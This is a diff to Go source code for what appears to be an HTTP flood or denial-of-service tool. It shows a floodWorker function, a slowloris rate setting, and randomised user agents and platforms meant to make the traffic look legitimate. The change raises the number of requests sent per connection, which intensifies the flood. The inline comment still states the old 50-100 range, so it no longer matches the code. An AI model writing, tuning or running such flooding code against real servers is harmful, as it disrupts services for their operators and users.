@@ -23,7 +23,7 @@ var (
 	httpMethods   = []string{"GET", "HEAD", "POST"}
 	userAgents    = []string{"Mozilla/5.0", "AppleWebKit/537.36", "Chrome/91.0", "Safari/537.36"}
 	platforms     = []string{"Macintosh", "Windows", "Linux", "Android", "iPhone"}
-	slowlorisRate = 0.3 // float64 type
+	slowlorisRate = 0.2 // float64 type
 )
 
 func init() {
@@ -112,7 +112,7 @@ func floodWorker(id int, stop <-chan struct{}) {
 				continue
 			}
 
-			for i := 0; i < rand.Intn(50)+50; i++ { // 50-100 requests/connection
+			for i := 0; i < rand.Intn(100)+100; i++ { // 50-100 requests/connection
 				method := httpMethods[rand.Intn(len(httpMethods))]
 				reqPath := path
 				if rand.Intn(2) == 0 {
